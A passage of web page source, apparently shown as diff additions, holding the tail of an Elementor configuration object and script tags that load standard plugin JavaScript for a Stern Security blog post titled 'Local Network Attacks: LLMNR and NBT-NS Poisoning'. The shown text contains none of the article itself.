Extra","value":1365,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1620,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"direction":"min","is_enabled":false}}},"version":"3.2.3","is_static":false,"experimentalFeatures":{"form-submissions":true},"urls":{"assets":"https:\/\/www.sternsecurity.com\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":2970,"title":"Local%20Network%20Attacks%3A%20LLMNR%20and%20NBT-NS%20Poisoning%20%E2%80%93%20Stern%20Security","excerpt":"","featuredImage":"https:\/\/www.sternsecurity.com\/wp-content\/uploads\/2020\/11\/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg"}};
+</script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.2.3' id='elementor-frontend-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor-pro/assets/js/preloaded-elements-handlers.min.js?ver=3.2.2' id='pro-preloaded-elements-handlers-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/js/preloaded-modules.min.js?ver=3.2.3' id='preloaded-modules-js'></script>
+
+</body>
+</html>
